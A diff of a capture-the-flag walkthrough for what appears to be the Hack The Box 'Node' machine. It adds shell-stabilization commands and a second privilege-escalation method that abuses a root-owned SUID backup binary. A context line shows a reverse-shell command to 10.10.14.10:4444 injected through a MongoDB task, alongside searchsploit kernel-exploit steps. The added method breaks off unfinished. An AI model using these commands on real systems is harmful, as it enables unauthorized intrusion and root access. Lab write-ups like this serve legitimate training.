@@ -208,7 +208,21 @@ db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'"})
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d0ba5da4-0ee6-4541-9d4e-12ec3eb812d9)
 
++ Stabilize shell:
+```
+script /dev/null -c bash
+CTRL^Z: Ctrl + Z
+stty raw -echo; fg
+reset
+terminal type? 'screen' or 'xterm'
+export TERM=xterm  
+export SHELL=bash
+stty rows 55 columns 285
+```
+
 ## Privilege Escalation
+
+### 1.Method:
 + Check kernel version: `uname -a`
 + `searchsploit 4.4.0-`
 + `searchsploit -m 44298`
@@ -221,6 +235,23 @@ db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'"})
 + Get root shell.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c475b937-09b3-430a-8c42-65c1c8a6e518)
+
+### 2.Method:
++ Look for SUID: `find / -group admin -ls 2>/dev/null`
++ SUID bit is set for the file, it will execute with the level of privilege that matches the user who owns the file.
++ **/usr/local/bin/backup** file is owned by root, and Tom is in 1002(admin) group. If we run it with tom, it still going to be running as root!
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d944e615-c053-4c4a-a630-3384575eaacd)
+
++ Check `/var/www/myplace/app.js`, and the file takes in three arguments: The string '-q', a backup key which is passed at the beginning of the script, and a directory path.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/900399b4-a04c-4cc9-aa77-56f21bfa75df)
+
++ Run the file with the arguments.
+
+
+
+
 
 # References & Alternatives:
 + https://0xdf.gitlab.io/2021/06/08/htb-node.html
